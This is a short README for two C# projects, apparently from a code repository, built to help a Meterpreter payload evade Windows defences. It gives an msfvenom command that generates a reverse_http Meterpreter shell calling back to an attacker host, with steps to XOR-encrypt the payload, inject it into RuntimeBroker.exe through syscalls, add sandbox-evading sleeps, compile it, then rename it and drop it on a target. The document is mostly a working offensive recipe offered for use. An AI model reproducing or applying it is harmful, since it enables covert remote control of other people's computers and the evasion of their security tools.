# Windows Defense Evasion

Meterpreter isn't a stealthy tool. These 2 c# projects attempts to make it more stealthy, by using:
- [T1027.010] Obfuscated Files or Information: Command Obfuscation (Multiple XOR encryption) 
- [T1055.002] Process Injection: Portable Executable Injection (DInvoke syscalls on each instance of RuntimeBroker.exe)
- [T1497.003] Virtualization/Sandbox Evasion: Time Based Evasion (Random sleep functions and random functions)
- [T1027.013] Obfuscated Files or Information: Encrypted/Encoded File (Multiple XOR encryption )

# XOR
Generate a payload with **msfvenom**:\
`msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<ip> LPORT=<port> -f csharp`

Copy the content and take note of the buffer size. Edit the source code, by pasting the payload and by adjusting the buffer size, then compile the program:\
`dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true`

Go to the location where the program has been compiled on `.\bin\Release\net7.0\win-x64\publish`:\
`.\xor_payload.exe`

# Payload
Edit the source code with the XOR encrypted payload, then compile the program:\
`dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true`

Rename the program and drop it to the computer.